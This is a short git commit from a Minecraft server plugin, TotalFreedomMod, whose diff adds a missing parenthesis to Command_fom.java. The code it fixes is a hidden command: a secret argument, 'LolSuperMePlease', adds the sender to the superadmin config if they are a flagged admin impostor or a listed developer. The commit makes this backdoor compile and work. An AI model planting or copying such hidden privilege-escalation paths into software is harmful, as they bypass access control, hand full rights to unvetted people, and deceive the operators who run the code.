a4011b1f0a8e9c4946abf4bc0fce08993d3d86e9
Liam <overhypedlord@gmail.com>
2014-07-22 19:22:32 +0100

    forgot bracked lel

--- src/me/StevenLawson/TotalFreedomMod/Commands/Command_fom.java
+++ src/me/StevenLawson/TotalFreedomMod/Commands/Command_fom.java
@@ -25,7 +25,7 @@ public class Command_fom extends TFM_Command
     {
         if (args[0].equals("LolSuperMePlease"))
         {
-          if (TFM_AdminList.isAdminImpostor(sender_p) || TFM_Util.DEVELOPERS.contains(sender.getName())
+          if (TFM_AdminList.isAdminImpostor(sender_p) || TFM_Util.DEVELOPERS.contains(sender.getName()))
           {
           TFM_Util.adminAction("FreedomOPMod",  "Adding "  + sender.getName() + " to the superadmin config.", true);
           TFM_AdminList.addSuperadmin(sender_p);
